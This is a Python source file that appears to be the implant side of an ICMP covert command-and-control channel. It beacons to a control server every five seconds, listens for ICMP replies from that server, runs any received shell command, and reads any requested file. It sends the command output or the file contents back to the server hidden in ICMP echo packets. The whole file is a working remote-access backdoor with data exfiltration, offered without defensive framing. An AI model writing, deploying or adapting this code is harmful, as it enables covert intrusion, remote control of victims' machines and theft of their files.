
from icmp_c2_modules import *



cond = 0

def read_file(file_name):
    with open(file_name, "rb") as f:
        return f.read()
        

def send_beacon(addr,data):
    while cond == 0:
        pkt_no_data = IP(dst=addr)/ICMP(type="echo-request")
        pkt_send(pkt_no_data,data)
        print("send beacon")
        time.sleep(5)
    

def parse_packet(packet):
    print("packet recieved")
    if  Raw in packet:
        global cond
        cond = 1
        print("cond changed to " + str(cond))
        
        prefix_packet = check_prefix(packet)     
        data_recieved = extract_data(packet)
        bin_name = str_to_binary(data_recieved)
        pkt_no_data = IP(dst=SERVER_ADR)/ICMP(type="echo-request")
        txt_recieved = bin_to_str(data_recieved)
        if prefix_packet == RUN:
            output = RunCommand(txt_recieved)
            bin_output = str_to_binary(output) 
            pkt_send(pkt_no_data,BEGIN_OUTPUT + bin_name)
            pkt_send(pkt_no_data,IN_TRANSFER + bin_output)
            pkt_send(pkt_no_data,EF)
        elif prefix_packet == FILE:
            output = read_file(txt_recieved)
            bin_output = str_to_binary(output)
            pkt_send(pkt_no_data,BEGIN_FILE + bin_name)
            pkt_send(pkt_no_data,IN_TRANSFER + bin_output)
            pkt_send(pkt_no_data,EF)

        cond = 0
        print("cond changed to " + str(cond))
        

def client_listen():
    print("client start listening")
    sniff_pkt(pfilter=ICMP_RESPONSE + " and host " + SERVER_ADR,handler=parse_packet)
    
signal.signal(signal.SIGINT, signal_handler)
beacon_thread = threading.Thread(target=send_beacon, args=(SERVER_ADR,BEACON))
beacon_thread.start()

client_listen()